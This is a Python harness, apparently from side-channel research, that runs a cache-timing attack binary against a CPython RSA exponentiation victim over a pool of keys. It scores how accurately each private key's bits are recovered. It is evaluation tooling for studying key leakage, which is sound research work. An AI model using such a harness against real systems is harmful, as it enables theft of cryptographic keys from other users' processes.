#!/usr/bin/env python3
"""Drive a single-CSI key-pool attack and analyze each key folder.

The attack runs the runtime + attacker:
    ./src/runtime/cpython/cpython_rt ../experiments/cpython_pow/python/cpython_pow.py 1
    ./experiments/cpython_pow/cpython_pow -PS -csi -key_pool -num_keys <N> <reps>
"""

import argparse
import glob
import os
import re
import shutil
import statistics
import subprocess
import time
from concurrent.futures import ProcessPoolExecutor, as_completed

from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)

import extract

HERE = os.path.dirname(os.path.abspath(__file__))


def find_project_root(start):
    d = os.path.abspath(start)
    while True:
        if os.path.exists(os.path.join(d, ".project")):
            return d
        parent = os.path.dirname(d)
        if parent == d:
            raise SystemExit("Could not locate .project marker above " + start)
        d = parent


def key_index(path):
    m = re.search(r"_key(\d+)_r", os.path.basename(path))
    return int(m.group(1)) if m else 1 << 30


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument(
        "--keys",
        type=int,
        default=128,
        help="pool size / number of keys (default: 128)",
    )
    ap.add_argument(
        "--reps",
        type=int,
        default=16,
        help="profiling repetitions per key (default: 16)",
    )
    ap.add_argument(
        "--no-csi", action="store_true", help="skip CSI (use static evset build)"
    )
    ap.add_argument(
        "--analyze-only",
        action="store_true",
        help="skip the attack; just run extract.py over existing key folders",
    )
    ap.add_argument(
        "--out-dir",
        default=None,
        help="directory holding key folders / logs "
        "(default: <build>/output/cpython_pow_key_pool)",
    )
    args = ap.parse_args()

    root = find_project_root(HERE)
    build_dir = os.path.join(root, "build")
    runtime = os.path.join(build_dir, "src/runtime/cpython/cpython_rt")
    victim = os.path.join(root, "experiments/cpython_pow/python/cpython_pow.py")
    attacker = os.path.join(build_dir, "experiments/cpython_pow/cpython_pow")
    key_pool_dir = os.path.join(root, "experiments/cpython_pow/rsa_key_pool")

    out_dir = (
        os.path.abspath(args.out_dir)
        if args.out_dir
        else os.path.join(build_dir, "output/cpython_pow_key_pool")
    )
    os.makedirs(out_dir, exist_ok=True)

    if not args.analyze_only:
        shutil.copyfile(
            os.path.join(key_pool_dir, "rsa_key_0.pem"),
            os.path.join(build_dir, "private.pem"),
        )

        at_cmd = [attacker, "-PS"]
        if not args.no_csi:
            at_cmd.append("-csi")
        at_cmd += ["-key_pool", "-num_keys", str(args.keys), str(args.reps)]

        print(f"[run] cwd={build_dir}")
        print(f"[run] runtime: {runtime} {victim} 1")
        print(f"[run] attacker: {' '.join(at_cmd)}")

        with open(os.path.join(out_dir, "runtime.log"), "w") as rt_log:
            rt = subprocess.Popen(
                [runtime, victim, "1"], cwd=build_dir, stdout=rt_log, stderr=rt_log
            )
            time.sleep(0.3)
            with open(os.path.join(out_dir, "attacker.log"), "w") as at_log:
                at = subprocess.Popen(
                    at_cmd, cwd=build_dir, stdout=at_log, stderr=at_log
                )
                at_rc = at.wait()
            rt.wait()
        print(f"[run] attacker rc={at_rc}")
        if at_rc != 0:
            print(f"[run] attacker failed; see {out_dir}/attacker.log")
            return at_rc

    folders = sorted(
        (
            f
            for f in glob.glob(os.path.join(out_dir, "cpython_pow_key*_r*"))
            if os.path.isdir(f)
        ),
        key=key_index,
    )
    if not folders:
        print(f"[analyze] no key folders under {out_dir}")
        return 1

    print(f"[analyze] {len(folders)} key folders")

    # Build per-key work: derive ground truth from the pooled .pem and list its
    # traces. Skipped keys (missing .pem / no traces) are reported but don't
    # block the rest.
    extract.attack_type = "PS"
    specs = []  # (folder, idx, files, d, gt_str)
    failures = 0
    for folder in folders:
        idx = key_index(folder)
        pem = os.path.join(key_pool_dir, f"rsa_key_{idx}.pem")
        if not os.path.exists(pem):
            print(f"  skip key {idx}: pooled key not found: {pem}")
            failures += 1
            continue
        keyfile = os.path.join(folder, "private.key")
        extract.write_key_from_pem(pem, keyfile)
        with open(keyfile) as f:
            bits = f.read().strip()[2:]
        files = extract.ps_trace_files(folder)
        if not files:
            print(f"  skip key {idx}: no traces under {folder}")
            failures += 1
            continue
        specs.append((folder, idx, files, list(map(int, bits)), bits))

    if not specs:
        print("[analyze] nothing to analyze")
        return 1

    # A single overall bar tracks key completion (no per-key / per-trace bars in
    # key-pool mode). All traces of all keys go through one process pool (all
    # CPUs); the moment a key's last trace is parsed we print that key's stats
    # and advance the bar — results stream out per key, in completion order.
    progress = Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        MofNCompleteColumn(),
        TextColumn("•"),
        TimeRemainingColumn(),
        TextColumn("•"),
        TimeElapsedColumn(),
    )

    meta = {folder: (idx, files, d, gt_str) for folder, idx, files, d, gt_str in specs}
    pending = {folder: len(files) for folder, _, files, _, _ in specs}
    collected = {folder: {} for folder, *_ in specs}
    merged_accs = []  # MERGED Accuracy% per key, for the final summary

    with progress:
        task = progress.add_task("[bold green]keys", total=len(specs))

        with ProcessPoolExecutor() as ex:
            fut_folder = {}
            for folder, idx, files, d, gt_str in specs:
                for fp in files:
                    fut = ex.submit(extract.process_PS_file_silent, fp, len(gt_str))
                    fut_folder[fut] = folder

            for fut in as_completed(fut_folder):
                folder = fut_folder[fut]
                fp, inf, err = fut.result()
                collected[folder][fp] = (inf, err)

                pending[folder] -= 1
                if pending[folder] == 0:
                    idx, files, d, gt_str = meta[folder]
                    metrics, lines = extract.summarize_ps(
                        folder, files, collected[folder], d, gt_str
                    )
                    progress.console.print(
                        f"\n===== {os.path.basename(folder)} (key {idx}) ====="
                    )
                    for line in lines:
                        progress.console.print(line)
                    if metrics:
                        merged_accs.append(metrics[-1]["Accuracy%"])
                    progress.update(task, advance=1)

    if merged_accs:
        print(
            f"\n[summary] merged accuracy over {len(merged_accs)} keys: "
            f"min={min(merged_accs):.2f}% "
            f"median={statistics.median(merged_accs):.2f}% "
            f"max={max(merged_accs):.2f}%"
        )
    else:
        print("\n[summary] no merged key results to summarize")

    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
